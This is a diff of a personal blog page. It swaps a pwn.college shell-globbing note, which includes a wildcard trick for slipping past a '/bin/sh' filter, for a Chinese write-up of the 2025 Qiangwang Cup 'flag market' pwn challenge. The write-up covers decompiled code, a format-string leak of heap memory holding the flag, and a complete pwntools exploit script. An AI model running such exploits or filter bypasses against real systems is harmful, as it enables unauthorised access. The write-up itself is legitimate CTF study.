@@ -19,21 +19,27 @@
   <meta name="author" content="yyyffff">
   <meta name="keywords" content="">
   
-    <meta name="description" content="linux-luminariumglobbing（通配符）*shell 会将遇到的任何 * 作为”通配符”，并尝试匹配文件来替换该参数，比如 1234hacker@dojo:~$ ls file_a	file_b	file_chacker@dojo:~$ echo Look: file_* # 这里会匹配任何以 file_开头的文件，这里有多个参数Look: file_a file_b file_">
+    <meta name="description" content="flag market信息123456789yyyffff@yyyffff-virtual-machine:&#x2F;mnt&#x2F;hgfs&#x2F;VMware-share&#x2F;fm&#x2F;bin$ checksec chall[*] &#x27;&#x2F;mnt&#x2F;hgfs&#x2F;VMware-share&#x2F;fm&#x2F;bin&#x2F;chall&#x27;    Arch:       amd64-64-little    RELRO:      Par">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn.college记录">
-<meta property="og:url" content="http://yyyffff.github.io/2025/09/22/pwn.college%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:title" content="2025强网杯线上赛部分pwn复现">
+<meta property="og:url" content="http://yyyffff.github.io/2025/10/30/2025%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="yyyffff&#39;s blog">
-<meta property="og:description" content="linux-luminariumglobbing（通配符）*shell 会将遇到的任何 * 作为”通配符”，并尝试匹配文件来替换该参数，比如 1234hacker@dojo:~$ ls file_a	file_b	file_chacker@dojo:~$ echo Look: file_* # 这里会匹配任何以 file_开头的文件，这里有多个参数Look: file_a file_b file_">
+<meta property="og:description" content="flag market信息123456789yyyffff@yyyffff-virtual-machine:&#x2F;mnt&#x2F;hgfs&#x2F;VMware-share&#x2F;fm&#x2F;bin$ checksec chall[*] &#x27;&#x2F;mnt&#x2F;hgfs&#x2F;VMware-share&#x2F;fm&#x2F;bin&#x2F;chall&#x27;    Arch:       amd64-64-little    RELRO:      Par">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-09-21T16:00:56.000Z">
-<meta property="article:modified_time" content="2025-10-27T03:19:26.280Z">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762174987841.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762175050868.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762175180201.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762175267268.png">
+<meta property="article:published_time" content="2025-10-30T09:31:02.000Z">
+<meta property="article:modified_time" content="2025-11-03T13:07:57.517Z">
 <meta property="article:author" content="yyyffff">
+<meta property="article:tag" content="赛题复现">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762174987841.png">
   
   
   
-  <title>pwn.college记录 - yyyffff&#39;s blog</title>
+  <title>2025强网杯线上赛部分pwn复现 - yyyffff&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +218,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pwn.college记录"></span>
+            <span id="subtitle" data-typed-text="2025强网杯线上赛部分pwn复现"></span>
           
         </div>
 
@@ -223,8 +229,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-09-22 00:00" pubdate>
-          2025年9月22日 凌晨
+        <time datetime="2025-10-30 17:31" pubdate>
+          2025年10月30日 下午
         </time>
       </span>
     
@@ -235,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          325 字
+          670 字
         
       </span>
     
@@ -246,7 +252,7 @@
         
         
         
-          3 分钟
+          6 分钟
         
       </span>
     
@@ -292,30 +298,35 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">pwn.college记录</h1>
+            <h1 id="seo-header">2025强网杯线上赛部分pwn复现</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="linux-luminarium"><a href="#linux-luminarium" class="headerlink" title="linux-luminarium"></a>linux-luminarium</h1><h2 id="globbing（通配符）"><a href="#globbing（通配符）" class="headerlink" title="globbing（通配符）"></a>globbing（通配符）</h2><h3 id><a href="#" class="headerlink" title="*"></a>*</h3><p>shell 会将遇到的任何 * 作为”通配符”，并尝试匹配文件来替换该参数，比如</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@dojo:~$ <span class="hljs-built_in">ls</span> <br>file_a	file_b	file_c<br>hacker@dojo:~$ <span class="hljs-built_in">echo</span> Look: file_* <span class="hljs-comment"># 这里会匹配任何以 file_开头的文件，这里有多个参数</span><br>Look: file_a file_b file_c<br></code></pre></td></tr></table></figure>
+                <h1 id="flag-market"><a href="#flag-market" class="headerlink" title="flag market"></a>flag market</h1><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">yyyffff@yyyffff-virtual-machine:/mnt/hgfs/VMware-share/fm/bin$ checksec chall<br>[*] <span class="hljs-string">&#x27;/mnt/hgfs/VMware-share/fm/bin/chall&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br></code></pre></td></tr></table></figure>
 
-<p>当只有一个文件时也是可以匹配的</p>
-<p>当 0 个文件时 shell 不会改变 * 这个参数</p>
-<p>不能匹配 &#x2F; 或前导.</p>
-<p>举个碰到过的例子，比如不允许 &#x2F;bin&#x2F;sh 那么我们就可以 &#x2F;bin&#x2F;*h ，它会自动匹配到 &#x2F;bin&#x2F;sh</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@dojo:~$ <span class="hljs-built_in">cat</span> /*fl*<br>pwn.college&#123;YEAH&#125;<br>hacker@dojo:~$<br></code></pre></td></tr></table></figure>
+<p>64位 x86-64 动态链接</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-84h]</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+14h] [rbp-7Ch]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">char</span> filename[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+27h] [rbp-69h] BYREF</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-60h] BYREF</span><br>  <span class="hljs-type">char</span> v9[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-50h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v10; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v10 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  sub_401336();<br>  <span class="hljs-built_in">strcpy</span>(filename, <span class="hljs-string">&quot;/flag&quot;</span>);<br>  stream = fopen(filename, <span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-comment">//这里打开后会创建一个堆存FILE</span><br>  dword_40430C = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit&quot;</span>);<br>      <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>      read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x10u</span>LL);<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)atoi(s) != <span class="hljs-number">1</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;how much you want to pay?&quot;</span>);<br>      <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>      read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x10u</span>LL);<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)atoi(s) == <span class="hljs-number">0xFF</span> ) <span class="hljs-comment">//输入-1即可通过检查</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You are so parsimonious!!!&quot;</span>); <span class="hljs-comment">//可以被下面data段的溢出控制，也就有了格式化字符串漏洞</span><br>      <span class="hljs-keyword">if</span> ( dword_40430C )<br>      &#123;<br>        fclose(stream);<span class="hljs-comment">//fclose后会将堆free掉，作为缓冲区的堆也会free，而和top chunk合并，不过其中内容并没有清空，我们还可以利用</span><br>        dword_40430C = <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(aThankYouForPay);<br>    <span class="hljs-keyword">if</span> ( !dword_40430C || !fgets(v9, <span class="hljs-number">0x40</span>, stream) )<span class="hljs-comment">// 读flag到v9内，这里会另外创建一个堆，作为缓冲区，里面存了flag的内容</span><br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( i &gt; <span class="hljs-number">0x40</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nThank you for your patronage!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v9[i] == <span class="hljs-string">&#x27;&#123;&#x27;</span> )                       <span class="hljs-comment">// 遇到&#123;即停止，无法输出完整flag</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">putchar</span>(v9[i]);<br>      sleep(<span class="hljs-number">1u</span>);<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(v9, <span class="hljs-number">0</span>, <span class="hljs-number">0x40u</span>LL);                     <span class="hljs-comment">// 清空栈上flag</span><br>    <span class="hljs-built_in">puts</span>(a1m31mError0mSo);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;opened user.log, please report:&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(oflag, <span class="hljs-number">0</span>, <span class="hljs-number">0x100u</span>LL);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, oflag);                <span class="hljs-comment">// 可以溢出到printf所在字符串</span><br>    getchar();<br>    fd = open(<span class="hljs-string">&quot;user.log&quot;</span>, (<span class="hljs-type">int</span>)oflag);<br>    write(fd, oflag, <span class="hljs-number">0x100u</span>LL);<br>    <span class="hljs-built_in">puts</span>(aOkNowYouCanExi);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;something is wrong&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>此处发生，shell 在 \ 中查找以任何内容开头（包含无内容）的所有文件，并且有 fl ，并且以任何内容结尾，这里就包括了 flag，也就是 cat &#x2F;flag</p>
-<h3 id="-1"><a href="#-1" class="headerlink" title="?"></a>?</h3><p>类似 * ，但是只匹配一个字符，比如</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@dojo:~$ <span class="hljs-built_in">ls</span><br>file_a	file_b	file_cc<br>hacker@dojo:~$ <span class="hljs-built_in">echo</span> Look: file_? <span class="hljs-comment"># 匹配一个字符</span><br>Look: file_a file_b<br>hacker@dojo:~$ <span class="hljs-built_in">echo</span> Look: file_?? <span class="hljs-comment"># 匹配两个</span><br>Look: file_cc<br></code></pre></td></tr></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>存在格式化字符串漏洞，那么我们就可以</p>
+<ul>
+<li>第一次输入价格时输入-1，通过检查，然后溢出data段，控制printf字符串为%9$p–%12$s，前者泄露堆地址，后者在后面泄露flag</li>
+</ul>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762174987841.png" srcset="/img/loading.gif" lazyload></p>
+<p>12的位置上是</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762175050868.png" srcset="/img/loading.gif" lazyload alt="1762175050868"></p>
+<p>这里输入的</p>
+<ul>
+<li>然后第二次进入菜单后输入一个可以被 %s 解析的地址保证程序不会崩溃，这里选择输入 0x00000000004041C0，并且泄露出了 heap 地址，并且计算与 flag 之间的偏移</li>
+</ul>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762175180201.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>第三次进入菜单时输入刚刚计算好的 flag 地址，即可被 %12s 解析从而输出flag</li>
+</ul>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">from pwn import *<br>context(<span class="hljs-built_in">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>sla = lambda a,b : r.sendlineafter(a,b)<br>sa  = lambda a,b : r.sendafter(a,b)<br>ru  = lambda a  :  r.recvuntil(a)<br>irt = lambda : r.interactive()<br>sla(<span class="hljs-string">&quot;2.exit\n&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;pay?\n&quot;</span>,<span class="hljs-string">&quot;-1&quot;</span>)<br>payload=b<span class="hljs-string">&#x27;a&#x27;</span>*0x100+b<span class="hljs-string">&#x27;%9$p--%12$s&#x27;</span><br>sla(<span class="hljs-string">&quot;report:\n&quot;</span>,payload)<br><br>sla(<span class="hljs-string">&quot;2.exit\n&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;pay?\n&quot;</span>,p64(0x00000000004041C0))<br>ru(<span class="hljs-string">&quot;0x&quot;</span>)<br>heap_addr=int(r.recvuntil(<span class="hljs-string">&quot;a0&quot;</span>),16)-0xa0+0x280<br><br>sla(<span class="hljs-string">&quot;2.exit\n&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;pay?\n&quot;</span>,p64(heap_addr))<br>irt()<br></code></pre></td></tr></table></figure>
 
-<h3 id="-2"><a href="#-2" class="headerlink" title="[]"></a>[]</h3><p>匹配括号内指定的某些字符串子集，比如 [abc] 就是匹配字符a b c</p>
-<p>例子</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@dojo:~$ <span class="hljs-built_in">touch</span> file_a<br>hacker@dojo:~$ <span class="hljs-built_in">touch</span> file_b<br>hacker@dojo:~$ <span class="hljs-built_in">touch</span> file_c<br>hacker@dojo:~$ <span class="hljs-built_in">ls</span><br>file_a	file_b	file_c<br>hacker@dojo:~$ <span class="hljs-built_in">echo</span> Look: file_[ab] <span class="hljs-comment"># 匹配字符a b</span><br>Look: file_a file_b<br></code></pre></td></tr></table></figure>
-
-<h3 id="匹配路径"><a href="#匹配路径" class="headerlink" title="[]匹配路径"></a>[]匹配路径</h3><p>[] 同样可以用来匹配路径，比如 &#x2F;challenge&#x2F;files&#x2F;file_[abc] 就会匹配 &#x2F;challenge&#x2F;files&#x2F;file_a &#x2F;challenge&#x2F;files&#x2F;file_b &#x2F;challenge&#x2F;files&#x2F;file_c</p>
-
+<p><img src="/2025/05/19/IO_FILE%20Exploit/%E7%8E%B0/1762175267268.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="bph"><a href="#bph" class="headerlink" title="bph"></a>bph</h2>
                 
               </div>
             
@@ -323,6 +334,13 @@
             <div>
               <div class="post-metas my-3">
   
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="print-no-link">#赛题复现</a>
+      
+    </div>
   
 </div>
 
@@ -332,8 +350,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pwn.college记录</div>
-      <div>http://yyyffff.github.io/2025/09/22/pwn.college记录/</div>
+      <div>2025强网杯线上赛部分pwn复现</div>
+      <div>http://yyyffff.github.io/2025/10/30/2025强网杯线上赛部分pwn复现/</div>
     </div>
     <div class="license-meta">
       
@@ -345,7 +363,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年9月22日</div>
+          <div>2025年10月30日</div>
         </div>
       
       
@@ -377,18 +395,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/10/09/dir-815%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="dir-815复现记录">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">dir-815复现记录</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/09/18/ARM%20mips%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/" title="ARM mips架构学习">
-                        <span class="hidden-mobile">ARM mips架构学习</span>
+                      <a href="/2025/10/09/dir-815%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="dir-815复现记录">
+                        <span class="hidden-mobile">dir-815复现记录</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
